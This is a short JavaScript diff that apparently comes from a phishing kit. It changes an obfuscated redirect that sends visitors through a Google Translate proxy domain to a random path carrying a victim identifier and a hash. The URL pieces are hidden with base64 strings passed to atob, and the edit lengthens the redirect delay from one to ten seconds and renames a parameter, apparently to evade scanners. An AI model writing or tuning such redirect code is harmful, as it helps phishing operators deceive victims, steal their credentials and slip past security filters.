@@ -186,8 +186,8 @@ function getRandomString(length) {
         .then(function(fileContents) {
           hash = fileContents;
           setTimeout(function() {
-            window.location.replace("https://"+dmain+atob('LnRyYW5zbGF0ZS5nb29nLw==')+randmd5+atob('L3Vuc3Vic2NyaWJlLmh0bWw/dT0=')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash);
-        }, 1000);
+            window.location.replace("https://"+dmain+atob('LnRyYW5zbGF0ZS5nb29nLw==')+randmd5+atob('L3Vuc3Vic2NyaWJlLmh0bWw/eD0=')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash);
+        }, 10000);
           
         });
           } else {
